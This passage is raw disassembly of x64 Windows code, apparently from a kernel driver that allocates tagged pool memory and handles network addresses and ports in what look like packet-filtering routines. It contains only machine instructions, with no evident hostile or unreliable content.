   140004fae:	e8 7d 20 00 00       	call   0x140007030
   140004fb3:	48 83 c4 68          	add    $0x68,%rsp
   140004fb7:	c3                   	ret
   140004fb8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004fbd:	55                   	push   %rbp
   140004fbe:	48 8d ac 24 30 fe ff 	lea    -0x1d0(%rsp),%rbp
   140004fc5:	ff 
   140004fc6:	48 81 ec d0 02 00 00 	sub    $0x2d0,%rsp
   140004fcd:	48 8b 05 0c 51 00 00 	mov    0x510c(%rip),%rax        # 0x14000a0e0
   140004fd4:	48 33 c4             	xor    %rsp,%rax
   140004fd7:	48 89 85 c8 01 00 00 	mov    %rax,0x1c8(%rbp)
   140004fde:	33 d2                	xor    %edx,%edx
   140004fe0:	48 8d 4d 54          	lea    0x54(%rbp),%rcx
   140004fe4:	44 8d 42 54          	lea    0x54(%rdx),%r8d
   140004fe8:	e8 53 21 00 00       	call   0x140007140
   140004fed:	8b 05 ad 26 00 00    	mov    0x26ad(%rip),%eax        # 0x1400076a0
   140004ff3:	48 8d 55 50          	lea    0x50(%rbp),%rdx
   140004ff7:	0f 10 05 82 26 00 00 	movups 0x2682(%rip),%xmm0        # 0x140007680
   140004ffe:	48 8b 0d 33 b6 00 00 	mov    0xb633(%rip),%rcx        # 0x140010638
   140005005:	45 33 c9             	xor    %r9d,%r9d
   140005008:	0f 10 0d 81 26 00 00 	movups 0x2681(%rip),%xmm1        # 0x140007690
   14000500f:	83 65 70 00          	andl   $0x0,0x70(%rbp)
   140005013:	45 33 c0             	xor    %r8d,%r8d
   140005016:	0f 11 85 30 01 00 00 	movups %xmm0,0x130(%rbp)
   14000501d:	89 85 50 01 00 00    	mov    %eax,0x150(%rbp)
   140005023:	0f 10 05 86 26 00 00 	movups 0x2686(%rip),%xmm0        # 0x1400076b0
   14000502a:	8b 05 b0 26 00 00    	mov    0x26b0(%rip),%eax        # 0x1400076e0
   140005030:	89 85 c0 01 00 00    	mov    %eax,0x1c0(%rbp)
   140005036:	48 8d 85 30 01 00 00 	lea    0x130(%rbp),%rax
   14000503d:	0f 11 85 90 01 00 00 	movups %xmm0,0x190(%rbp)
   140005044:	48 89 45 60          	mov    %rax,0x60(%rbp)
   140005048:	48 8d 85 90 01 00 00 	lea    0x190(%rbp),%rax
   14000504f:	0f 10 05 7a 26 00 00 	movups 0x267a(%rip),%xmm0        # 0x1400076d0
   140005056:	48 89 45 68          	mov    %rax,0x68(%rbp)
   14000505a:	0f 11 8d 40 01 00 00 	movups %xmm1,0x140(%rbp)
   140005061:	0f 10 0d 58 26 00 00 	movups 0x2658(%rip),%xmm1        # 0x1400076c0
   140005068:	0f 11 85 b0 01 00 00 	movups %xmm0,0x1b0(%rbp)
   14000506f:	0f 10 05 72 34 00 00 	movups 0x3472(%rip),%xmm0        # 0x1400084e8
   140005076:	0f 11 8d a0 01 00 00 	movups %xmm1,0x1a0(%rbp)
   14000507d:	f3 0f 7f 45 50       	movdqu %xmm0,0x50(%rbp)
   140005082:	0f 10 05 67 33 00 00 	movups 0x3367(%rip),%xmm0        # 0x1400083f0
   140005089:	f3 0f 7f 85 90 00 00 	movdqu %xmm0,0x90(%rbp)
   140005090:	00 
   140005091:	e8 79 1e 00 00       	call   0x140006f0f
   140005096:	8b d8                	mov    %eax,%ebx
   140005098:	85 c0                	test   %eax,%eax
   14000509a:	74 13                	je     0x1400050af
   14000509c:	48 8b 0d 95 b5 00 00 	mov    0xb595(%rip),%rcx        # 0x140010638
   1400050a3:	e8 55 1e 00 00       	call   0x140006efd
   1400050a8:	8b c3                	mov    %ebx,%eax
   1400050aa:	e9 b5 01 00 00       	jmp    0x140005264
   1400050af:	33 d2                	xor    %edx,%edx
   1400050b1:	48 8d 4c 24 34       	lea    0x34(%rsp),%rcx
   1400050b6:	44 8d 42 44          	lea    0x44(%rdx),%r8d
   1400050ba:	e8 81 20 00 00       	call   0x140007140
   1400050bf:	0f 10 05 32 34 00 00 	movups 0x3432(%rip),%xmm0        # 0x1400084f8
   1400050c6:	0f b7 05 43 26 00 00 	movzwl 0x2643(%rip),%eax        # 0x140007710
   1400050cd:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400050d2:	0f 10 0d 17 26 00 00 	movups 0x2617(%rip),%xmm1        # 0x1400076f0
   1400050d9:	48 8b 0d 58 b5 00 00 	mov    0xb558(%rip),%rcx        # 0x140010638
   1400050e0:	45 33 c0             	xor    %r8d,%r8d
   1400050e3:	83 64 24 50 00       	andl   $0x0,0x50(%rsp)
   1400050e8:	66 89 85 d0 00 00 00 	mov    %ax,0xd0(%rbp)
   1400050ef:	48 8d 85 b0 00 00 00 	lea    0xb0(%rbp),%rax
   1400050f6:	f3 0f 7f 44 24 30    	movdqu %xmm0,0x30(%rsp)
   1400050fc:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140005101:	0f 10 05 f8 25 00 00 	movups 0x25f8(%rip),%xmm0        # 0x140007700
   140005108:	8b 05 3a 26 00 00    	mov    0x263a(%rip),%eax        # 0x140007748
   14000510e:	89 85 28 01 00 00    	mov    %eax,0x128(%rbp)
   140005114:	48 8d 85 00 01 00 00 	lea    0x100(%rbp),%rax
   14000511b:	0f 11 85 c0 00 00 00 	movups %xmm0,0xc0(%rbp)
   140005122:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140005127:	b8 ff ff 00 00       	mov    $0xffff,%eax
   14000512c:	0f 10 05 ed 25 00 00 	movups 0x25ed(%rip),%xmm0        # 0x140007720
   140005133:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   140005138:	0f 11 8d b0 00 00 00 	movups %xmm1,0xb0(%rbp)
   14000513f:	0f 10 0d ea 25 00 00 	movups 0x25ea(%rip),%xmm1        # 0x140007730
   140005146:	0f 11 85 00 01 00 00 	movups %xmm0,0x100(%rbp)
   14000514d:	f2 0f 10 05 eb 25 00 	movsd  0x25eb(%rip),%xmm0        # 0x140007740
   140005154:	00 
   140005155:	f2 0f 11 85 20 01 00 	movsd  %xmm0,0x120(%rbp)
   14000515c:	00 
   14000515d:	0f 11 8d 10 01 00 00 	movups %xmm1,0x110(%rbp)
   140005164:	e8 9a 1d 00 00       	call   0x140006f03
   140005169:	8b d8                	mov    %eax,%ebx
   14000516b:	85 c0                	test   %eax,%eax
   14000516d:	0f 85 29 ff ff ff    	jne    0x14000509c
   140005173:	48 83 4c 24 20 ff    	orq    $0xffffffffffffffff,0x20(%rsp)
   140005179:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   14000517d:	33 d2                	xor    %edx,%edx
   14000517f:	41 b8 c8 00 00 00    	mov    $0xc8,%r8d
   140005185:	e8 b6 1f 00 00       	call   0x140007140
   14000518a:	0f 10 05 bf 25 00 00 	movups 0x25bf(%rip),%xmm0        # 0x140007750
   140005191:	0f b7 05 d8 25 00 00 	movzwl 0x25d8(%rip),%eax        # 0x140007770
   140005198:	4c 8d 0d a9 b4 00 00 	lea    0xb4a9(%rip),%r9        # 0x140010648
   14000519f:	0f 10 0d ba 25 00 00 	movups 0x25ba(%rip),%xmm1        # 0x140007760
   1400051a6:	48 8b 0d 8b b4 00 00 	mov    0xb48b(%rip),%rcx        # 0x140010638
   1400051ad:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   1400051b1:	21 5d f0             	and    %ebx,-0x10(%rbp)
   1400051b4:	45 33 c0             	xor    %r8d,%r8d
   1400051b7:	0f 11 85 d8 00 00 00 	movups %xmm0,0xd8(%rbp)
   1400051be:	66 89 85 f8 00 00 00 	mov    %ax,0xf8(%rbp)
   1400051c5:	48 8d 85 d8 00 00 00 	lea    0xd8(%rbp),%rax
   1400051cc:	0f 10 05 ad 25 00 00 	movups 0x25ad(%rip),%xmm0        # 0x140007780
   1400051d3:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   1400051d7:	0f b7 05 d2 25 00 00 	movzwl 0x25d2(%rip),%eax        # 0x1400077b0
   1400051de:	0f 11 85 58 01 00 00 	movups %xmm0,0x158(%rbp)
   1400051e5:	66 89 85 88 01 00 00 	mov    %ax,0x188(%rbp)
   1400051ec:	48 8d 85 58 01 00 00 	lea    0x158(%rbp),%rax
   1400051f3:	0f 10 05 a6 25 00 00 	movups 0x25a6(%rip),%xmm0        # 0x1400077a0
   1400051fa:	48 89 45 98          	mov    %rax,-0x68(%rbp)
   1400051fe:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140005203:	0f 11 8d e8 00 00 00 	movups %xmm1,0xe8(%rbp)
   14000520a:	c7 45 00 03 50 00 00 	movl   $0x5003,0x0(%rbp)
   140005211:	0f 10 0d 78 25 00 00 	movups 0x2578(%rip),%xmm1        # 0x140007790
   140005218:	c7 45 e0 04 00 00 00 	movl   $0x4,-0x20(%rbp)
   14000521f:	0f 11 85 78 01 00 00 	movups %xmm0,0x178(%rbp)
   140005226:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000522a:	0f 10 05 c7 32 00 00 	movups 0x32c7(%rip),%xmm0        # 0x1400084f8
   140005231:	0f 11 8d 68 01 00 00 	movups %xmm1,0x168(%rbp)
   140005238:	0f 10 0d a9 32 00 00 	movups 0x32a9(%rip),%xmm1        # 0x1400084e8
   14000523f:	f3 0f 7f 45 d0       	movdqu %xmm0,-0x30(%rbp)
   140005244:	0f 10 05 a5 31 00 00 	movups 0x31a5(%rip),%xmm0        # 0x1400083f0
   14000524b:	f3 0f 7f 4d 04       	movdqu %xmm1,0x4(%rbp)
   140005250:	f3 0f 7f 45 c0       	movdqu %xmm0,-0x40(%rbp)
   140005255:	e8 bb 1c 00 00       	call   0x140006f15
   14000525a:	8b d8                	mov    %eax,%ebx
   14000525c:	85 c0                	test   %eax,%eax
   14000525e:	0f 85 38 fe ff ff    	jne    0x14000509c
   140005264:	48 8b 8d c8 01 00 00 	mov    0x1c8(%rbp),%rcx
   14000526b:	48 33 cc             	xor    %rsp,%rcx
   14000526e:	e8 bd 1d 00 00       	call   0x140007030
   140005273:	48 8b 9c 24 e0 02 00 	mov    0x2e0(%rsp),%rbx
   14000527a:	00 
   14000527b:	48 81 c4 d0 02 00 00 	add    $0x2d0,%rsp
   140005282:	5d                   	pop    %rbp
   140005283:	c3                   	ret
   140005284:	40 53                	rex push %rbx
   140005286:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   14000528d:	48 8b 05 4c 4e 00 00 	mov    0x4e4c(%rip),%rax        # 0x14000a0e0
   140005294:	48 33 c4             	xor    %rsp,%rax
   140005297:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   14000529e:	00 
   14000529f:	33 d2                	xor    %edx,%edx
   1400052a1:	48 8b d9             	mov    %rcx,%rbx
   1400052a4:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400052a9:	44 8d 42 48          	lea    0x48(%rdx),%r8d
   1400052ad:	e8 8e 1e 00 00       	call   0x140007140
   1400052b2:	45 33 c0             	xor    %r8d,%r8d
   1400052b5:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   1400052bc:	00 
   1400052bd:	48 8d 05 74 b3 00 00 	lea    0xb374(%rip),%rax        # 0x140010638
   1400052c4:	33 c9                	xor    %ecx,%ecx
   1400052c6:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1400052cb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400052d0:	41 8d 50 0a          	lea    0xa(%r8),%edx
   1400052d4:	e8 0c 1c 00 00       	call   0x140006ee5
   1400052d9:	85 c0                	test   %eax,%eax
   1400052db:	78 52                	js     0x14000532f
   1400052dd:	48 8b 0d 54 b3 00 00 	mov    0xb354(%rip),%rcx        # 0x140010638
   1400052e4:	33 d2                	xor    %edx,%edx
   1400052e6:	e8 06 1c 00 00       	call   0x140006ef1
   1400052eb:	85 c0                	test   %eax,%eax
   1400052ed:	78 40                	js     0x14000532f
   1400052ef:	48 8b cb             	mov    %rbx,%rcx
   1400052f2:	e8 35 fc ff ff       	call   0x140004f2c
   1400052f7:	8b d8                	mov    %eax,%ebx
   1400052f9:	85 c0                	test   %eax,%eax
   1400052fb:	79 0e                	jns    0x14000530b
   1400052fd:	48 8b 0d 34 b3 00 00 	mov    0xb334(%rip),%rcx        # 0x140010638
   140005304:	e8 f4 1b 00 00       	call   0x140006efd
   140005309:	eb 22                	jmp    0x14000532d
   14000530b:	e8 a8 fc ff ff       	call   0x140004fb8
   140005310:	48 8b 0d 21 b3 00 00 	mov    0xb321(%rip),%rcx        # 0x140010638
   140005317:	e8 db 1b 00 00       	call   0x140006ef7
   14000531c:	8b d8                	mov    %eax,%ebx
   14000531e:	85 c0                	test   %eax,%eax
   140005320:	79 0b                	jns    0x14000532d
   140005322:	8b 0d 18 b3 00 00    	mov    0xb318(%rip),%ecx        # 0x140010640
   140005328:	e8 b2 1b 00 00       	call   0x140006edf
   14000532d:	8b c3                	mov    %ebx,%eax
   14000532f:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140005336:	00 
   140005337:	48 33 cc             	xor    %rsp,%rcx
   14000533a:	e8 f1 1c 00 00       	call   0x140007030
   14000533f:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140005346:	5b                   	pop    %rbx
   140005347:	c3                   	ret
   140005348:	48 83 ec 28          	sub    $0x28,%rsp
   14000534c:	48 8b 0d e5 b2 00 00 	mov    0xb2e5(%rip),%rcx        # 0x140010638
   140005353:	48 85 c9             	test   %rcx,%rcx
   140005356:	74 40                	je     0x140005398
   140005358:	48 8b 15 e9 b2 00 00 	mov    0xb2e9(%rip),%rdx        # 0x140010648
   14000535f:	48 85 d2             	test   %rdx,%rdx
   140005362:	74 05                	je     0x140005369
   140005364:	e8 b2 1b 00 00       	call   0x140006f1b
   140005369:	48 8b 0d c8 b2 00 00 	mov    0xb2c8(%rip),%rcx        # 0x140010638
   140005370:	48 8d 15 81 31 00 00 	lea    0x3181(%rip),%rdx        # 0x1400084f8
   140005377:	e8 8d 1b 00 00       	call   0x140006f09
   14000537c:	8b 0d be b2 00 00    	mov    0xb2be(%rip),%ecx        # 0x140010640
   140005382:	e8 58 1b 00 00       	call   0x140006edf
   140005387:	48 8b 0d aa b2 00 00 	mov    0xb2aa(%rip),%rcx        # 0x140010638
   14000538e:	48 85 c9             	test   %rcx,%rcx
   140005391:	74 05                	je     0x140005398
   140005393:	e8 53 1b 00 00       	call   0x140006eeb
   140005398:	48 83 c4 28          	add    $0x28,%rsp
   14000539c:	c3                   	ret
   14000539d:	cc                   	int3
   14000539e:	cc                   	int3
   14000539f:	cc                   	int3
   1400053a0:	4d 85 c0             	test   %r8,%r8
   1400053a3:	0f 84 05 01 00 00    	je     0x1400054ae
   1400053a9:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400053ae:	55                   	push   %rbp
   1400053af:	56                   	push   %rsi
   1400053b0:	57                   	push   %rdi
   1400053b1:	48 8d 6c 24 d1       	lea    -0x2f(%rsp),%rbp
   1400053b6:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   1400053bd:	48 8b 05 1c 4d 00 00 	mov    0x4d1c(%rip),%rax        # 0x14000a0e0
   1400053c4:	48 33 c4             	xor    %rsp,%rax
   1400053c7:	48 89 45 1f          	mov    %rax,0x1f(%rbp)
   1400053cb:	48 8b 5d 7f          	mov    0x7f(%rbp),%rbx
   1400053cf:	49 8b f1             	mov    %r9,%rsi
   1400053d2:	48 83 65 b7 00       	andq   $0x0,-0x49(%rbp)
   1400053d7:	83 65 af 00          	andl   $0x0,-0x51(%rbp)
   1400053db:	4c 8b 4d 6f          	mov    0x6f(%rbp),%r9
   1400053df:	8b 43 18             	mov    0x18(%rbx),%eax
   1400053e2:	a8 01                	test   $0x1,%al
   1400053e4:	0f 84 a6 00 00 00    	je     0x140005490
   1400053ea:	66 83 39 42          	cmpw   $0x42,(%rcx)
   1400053ee:	48 8b 42 40          	mov    0x40(%rdx),%rax
   1400053f2:	48 89 45 cf          	mov    %rax,-0x31(%rbp)
   1400053f6:	c7 45 d7 ff ff 00 00 	movl   $0xffff,-0x29(%rbp)
   1400053fd:	0f 85 87 00 00 00    	jne    0x14000548a
   140005403:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140005407:	48 8d 55 af          	lea    -0x51(%rbp),%rdx
   14000540b:	c7 45 bf 04 00 00 00 	movl   $0x4,-0x41(%rbp)
   140005412:	8b 41 28             	mov    0x28(%rcx),%eax
   140005415:	89 45 c3             	mov    %eax,-0x3d(%rbp)
   140005418:	44 8b 41 68          	mov    0x68(%rcx),%r8d
   14000541c:	44 89 45 c7          	mov    %r8d,-0x39(%rbp)
   140005420:	0f b7 41 48          	movzwl 0x48(%rcx),%eax
   140005424:	66 89 45 cb          	mov    %ax,-0x35(%rbp)
   140005428:	0f b7 81 88 00 00 00 	movzwl 0x88(%rcx),%eax
   14000542f:	c7 03 02 10 00 00    	movl   $0x1002,(%rbx)
   140005435:	0f 10 03             	movups (%rbx),%xmm0
   140005438:	66 89 45 cd          	mov    %ax,-0x33(%rbp)
   14000543c:	0f 10 4b 10          	movups 0x10(%rbx),%xmm1
   140005440:	49 8b 01             	mov    (%r9),%rax
   140005443:	0f 29 45 ef          	movaps %xmm0,-0x11(%rbp)
   140005447:	f2 0f 10 43 20       	movsd  0x20(%rbx),%xmm0
   14000544c:	41 0f c8             	bswap  %r8d
   14000544f:	41 8b c8             	mov    %r8d,%ecx
   140005452:	f2 0f 11 45 0f       	movsd  %xmm0,0xf(%rbp)
   140005457:	0f 29 4d ff          	movaps %xmm1,-0x1(%rbp)
   14000545b:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   14000545f:	e8 5c 04 00 00       	call   0x1400058c0
   140005464:	8b f8                	mov    %eax,%edi
   140005466:	85 c0                	test   %eax,%eax
   140005468:	74 26                	je     0x140005490
   14000546a:	4c 8d 45 b7          	lea    -0x49(%rbp),%r8
   14000546e:	33 d2                	xor    %edx,%edx
   140005470:	48 8b ce             	mov    %rsi,%rcx
   140005473:	e8 a9 1a 00 00       	call   0x140006f21
   140005478:	85 c0                	test   %eax,%eax
   14000547a:	74 33                	je     0x1400054af
   14000547c:	8b d0                	mov    %eax,%edx
   14000547e:	48 8d 0d 3b 23 00 00 	lea    0x233b(%rip),%rcx        # 0x1400077c0
   140005485:	e8 26 e3 ff ff       	call   0x1400037b0
   14000548a:	c7 03 02 10 00 00    	movl   $0x1002,(%rbx)
   140005490:	48 8b 4d 1f          	mov    0x1f(%rbp),%rcx
   140005494:	48 33 cc             	xor    %rsp,%rcx
   140005497:	e8 94 1b 00 00       	call   0x140007030
   14000549c:	48 8b 9c 24 f0 00 00 	mov    0xf0(%rsp),%rbx
   1400054a3:	00 
   1400054a4:	48 81 c4 c0 00 00 00 	add    $0xc0,%rsp
   1400054ab:	5f                   	pop    %rdi
   1400054ac:	5e                   	pop    %rsi
   1400054ad:	5d                   	pop    %rbp
   1400054ae:	c3                   	ret
   1400054af:	48 8b 45 b7          	mov    -0x49(%rbp),%rax
   1400054b3:	0f b7 4d cd          	movzwl -0x33(%rbp),%ecx
   1400054b7:	44 0f b6 55 ca       	movzbl -0x36(%rbp),%r10d
   1400054bc:	44 0f b6 4d c9       	movzbl -0x37(%rbp),%r9d
   1400054c1:	44 0f b6 45 c8       	movzbl -0x38(%rbp),%r8d
   1400054c6:	0f b6 55 c7          	movzbl -0x39(%rbp),%edx
   1400054ca:	48 89 45 df          	mov    %rax,-0x21(%rbp)
   1400054ce:	8b 45 af             	mov    -0x51(%rbp),%eax
   1400054d1:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1400054d5:	8b 45 c7             	mov    -0x39(%rbp),%eax
   1400054d8:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400054dc:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   1400054e0:	48 8d 0d 19 23 00 00 	lea    0x2319(%rip),%rcx        # 0x140007800
   1400054e7:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   1400054ec:	e8 bf e2 ff ff       	call   0x1400037b0
   1400054f1:	0f b7 4d cd          	movzwl -0x33(%rbp),%ecx
   1400054f5:	b2 01                	mov    $0x1,%dl
   1400054f7:	8b 45 af             	mov    -0x51(%rbp),%eax
   1400054fa:	85 c0                	test   %eax,%eax
   1400054fc:	0f cf                	bswap  %edi
   1400054fe:	66 0f 45 c8          	cmovne %ax,%cx
   140005502:	89 7d c7             	mov    %edi,-0x39(%rbp)
   140005505:	66 89 4d cd          	mov    %cx,-0x33(%rbp)
   140005509:	48 8d 4d bf          	lea    -0x41(%rbp),%rcx
   14000550d:	e8 12 00 00 00       	call   0x140005524
   140005512:	e9 79 ff ff ff       	jmp    0x140005490
   140005517:	cc                   	int3
   140005518:	cc                   	int3
   140005519:	cc                   	int3
   14000551a:	cc                   	int3
   14000551b:	cc                   	int3
   14000551c:	cc                   	int3
   14000551d:	cc                   	int3
   14000551e:	cc                   	int3
   14000551f:	cc                   	int3
   140005520:	33 c0                	xor    %eax,%eax
   140005522:	c3                   	ret
   140005523:	cc                   	int3
   140005524:	48 8b c4             	mov    %rsp,%rax
   140005527:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000552b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000552f:	57                   	push   %rdi
   140005530:	48 83 ec 30          	sub    $0x30,%rsp
   140005534:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   140005539:	48 8d 79 30          	lea    0x30(%rcx),%rdi
   14000553d:	40 8a f2             	mov    %dl,%sil
   140005540:	48 89 78 e8          	mov    %rdi,-0x18(%rax)
   140005544:	48 8b 51 28          	mov    0x28(%rcx),%rdx
   140005548:	4c 8d 48 08          	lea    0x8(%rax),%r9
   14000554c:	48 8b d9             	mov    %rcx,%rbx
   14000554f:	45 33 c0             	xor    %r8d,%r8d
   140005552:	48 8b 49 20          	mov    0x20(%rcx),%rcx
   140005556:	e8 d8 19 00 00       	call   0x140006f33
   14000555b:	85 c0                	test   %eax,%eax
   14000555d:	74 11                	je     0x140005570
   14000555f:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140005563:	e8 bf 19 00 00       	call   0x140006f27
   140005568:	c7 07 02 10 00 00    	movl   $0x1002,(%rdi)
   14000556e:	eb 7b                	jmp    0x1400055eb
   140005570:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140005575:	40 84 f6             	test   %sil,%sil
   140005578:	74 41                	je     0x1400055bb
   14000557a:	83 3b 04             	cmpl   $0x4,(%rbx)
   14000557d:	75 2e                	jne    0x1400055ad
   14000557f:	8b 43 08             	mov    0x8(%rbx),%eax
   140005582:	0f c8                	bswap  %eax
   140005584:	89 82 84 00 00 00    	mov    %eax,0x84(%rdx)
   14000558a:	0f b7 43 0e          	movzwl 0xe(%rbx),%eax
   14000558e:	66 c1 c8 08          	ror    $0x8,%ax
   140005592:	66 89 82 82 00 00 00 	mov    %ax,0x82(%rdx)
   140005599:	8b 43 04             	mov    0x4(%rbx),%eax
   14000559c:	0f c8                	bswap  %eax
   14000559e:	89 42 04             	mov    %eax,0x4(%rdx)
   1400055a1:	0f b7 43 0c          	movzwl 0xc(%rbx),%eax
   1400055a5:	66 c1 c8 08          	ror    $0x8,%ax
   1400055a9:	66 89 42 02          	mov    %ax,0x2(%rdx)
   1400055ad:	8b 43 18             	mov    0x18(%rbx),%eax
   1400055b0:	89 82 08 01 00 00    	mov    %eax,0x108(%rdx)
   1400055b6:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1400055bb:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   1400055bf:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400055c5:	e8 6f 19 00 00       	call   0x140006f39
   1400055ca:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   1400055ce:	4c 8b c7             	mov    %rdi,%r8
   1400055d1:	83 4b 48 01          	orl    $0x1,0x48(%rbx)
   1400055d5:	33 d2                	xor    %edx,%edx
   1400055d7:	c7 07 02 10 00 00    	movl   $0x1002,(%rdi)
   1400055dd:	e8 4b 19 00 00       	call   0x140006f2d
   1400055e2:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   1400055e6:	e8 3c 19 00 00       	call   0x140006f27
   1400055eb:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1400055f0:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400055f5:	48 83 c4 30          	add    $0x30,%rsp
   1400055f9:	5f                   	pop    %rdi
   1400055fa:	c3                   	ret
   1400055fb:	cc                   	int3
   1400055fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005601:	57                   	push   %rdi
   140005602:	48 83 ec 20          	sub    $0x20,%rsp
   140005606:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   14000560b:	48 8b fa             	mov    %rdx,%rdi
   14000560e:	48 8b d9             	mov    %rcx,%rbx
   140005611:	74 55                	je     0x140005668
   140005613:	48 83 39 00          	cmpq   $0x0,(%rcx)
   140005617:	74 4f                	je     0x140005668
   140005619:	ba 20 00 00 00       	mov    $0x20,%edx
   14000561e:	33 c9                	xor    %ecx,%ecx
   140005620:	41 b8 54 4c 58 45    	mov    $0x45584c54,%r8d
   140005626:	ff 15 e4 2c 00 00    	call   *0x2ce4(%rip)        # 0x140008310
   14000562c:	48 85 c0             	test   %rax,%rax
   14000562f:	75 07                	jne    0x140005638
   140005631:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   140005636:	eb 35                	jmp    0x14000566d
   140005638:	0f 10 07             	movups (%rdi),%xmm0
   14000563b:	0f 11 00             	movups %xmm0,(%rax)
   14000563e:	0f 10 4f 10          	movups 0x10(%rdi),%xmm1
   140005642:	0f 11 48 10          	movups %xmm1,0x10(%rax)
   140005646:	48 8b 0b             	mov    (%rbx),%rcx
   140005649:	48 39 59 08          	cmp    %rbx,0x8(%rcx)
   14000564d:	74 07                	je     0x140005656
   14000564f:	b9 03 00 00 00       	mov    $0x3,%ecx
   140005654:	cd 29                	int    $0x29
   140005656:	48 89 08             	mov    %rcx,(%rax)
   140005659:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000565d:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140005661:	48 89 03             	mov    %rax,(%rbx)
   140005664:	33 c0                	xor    %eax,%eax
   140005666:	eb 05                	jmp    0x14000566d
   140005668:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   14000566d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005672:	48 83 c4 20          	add    $0x20,%rsp
   140005676:	5f                   	pop    %rdi
   140005677:	c3                   	ret
   140005678:	4c 8b dc             	mov    %rsp,%r11
   14000567b:	48 83 ec 48          	sub    $0x48,%rsp
   14000567f:	33 c0                	xor    %eax,%eax
   140005681:	49 89 4b e8          	mov    %rcx,-0x18(%r11)
   140005685:	49 89 43 e0          	mov    %rax,-0x20(%r11)
   140005689:	48 8d 0d c0 af 00 00 	lea    0xafc0(%rip),%rcx        # 0x140010650
   140005690:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   140005694:	41 80 f8 01          	cmp    $0x1,%r8b
   140005698:	89 54 24 38          	mov    %edx,0x38(%rsp)
   14000569c:	0f 44 c2             	cmove  %edx,%eax
   14000569f:	49 8d 53 d8          	lea    -0x28(%r11),%rdx
   1400056a3:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
   1400056a7:	e8 50 ff ff ff       	call   0x1400055fc
   1400056ac:	48 83 c4 48          	add    $0x48,%rsp
   1400056b0:	c3                   	ret
   1400056b1:	cc                   	int3
   1400056b2:	cc                   	int3
   1400056b3:	cc                   	int3
   1400056b4:	48 8d 0d 95 af 00 00 	lea    0xaf95(%rip),%rcx        # 0x140010650
   1400056bb:	e9 4c df ff ff       	jmp    0x14000360c
   1400056c0:	48 8d 0d 89 af 00 00 	lea    0xaf89(%rip),%rcx        # 0x140010650
   1400056c7:	e9 94 df ff ff       	jmp    0x140003660
   1400056cc:	48 83 3d 84 af 00 00 	cmpq   $0x0,0xaf84(%rip)        # 0x140010658
   1400056d3:	00 
   1400056d4:	74 2e                	je     0x140005704
   1400056d6:	48 8b 15 73 af 00 00 	mov    0xaf73(%rip),%rdx        # 0x140010650
   1400056dd:	48 85 d2             	test   %rdx,%rdx
   1400056e0:	74 22                	je     0x140005704
   1400056e2:	48 8d 05 67 af 00 00 	lea    0xaf67(%rip),%rax        # 0x140010650
   1400056e9:	48 3b d0             	cmp    %rax,%rdx
   1400056ec:	74 16                	je     0x140005704
   1400056ee:	48 85 d2             	test   %rdx,%rdx
   1400056f1:	74 11                	je     0x140005704
   1400056f3:	48 39 4a 10          	cmp    %rcx,0x10(%rdx)
   1400056f7:	74 05                	je     0x1400056fe
   1400056f9:	48 8b 12             	mov    (%rdx),%rdx
   1400056fc:	eb eb                	jmp    0x1400056e9
   1400056fe:	8b 42 18             	mov    0x18(%rdx),%eax
   140005701:	89 42 1c             	mov    %eax,0x1c(%rdx)
   140005704:	c3                   	ret
   140005705:	cc                   	int3
   140005706:	cc                   	int3
   140005707:	cc                   	int3
   140005708:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000570d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005712:	57                   	push   %rdi
   140005713:	48 83 ec 20          	sub    $0x20,%rsp
   140005717:	48 83 3d 39 af 00 00 	cmpq   $0x0,0xaf39(%rip)        # 0x140010658
   14000571e:	00 
   14000571f:	8b f9                	mov    %ecx,%edi
   140005721:	74 44                	je     0x140005767
   140005723:	48 8b 1d 26 af 00 00 	mov    0xaf26(%rip),%rbx        # 0x140010650
   14000572a:	48 85 db             	test   %rbx,%rbx
   14000572d:	74 38                	je     0x140005767
